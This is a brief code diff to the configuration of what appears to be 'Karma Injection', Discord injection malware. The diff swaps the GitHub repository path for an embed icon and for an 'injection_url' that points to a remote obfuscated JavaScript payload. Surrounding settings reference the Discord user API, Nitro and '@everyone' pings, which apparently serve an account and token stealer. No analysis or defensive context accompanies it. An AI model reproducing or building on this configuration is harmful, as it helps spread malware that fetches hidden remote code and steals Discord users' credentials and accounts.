@@ -12,9 +12,9 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Karma Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/gzlaw/injection/main/pfp/bin.png', 
+  embed_icon: 'https://raw.githubusercontent.com/gzlaw/karma-injection/main/pfp/bin.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/gzlaw/injection/main/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/gzlaw/karma-injection/main/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
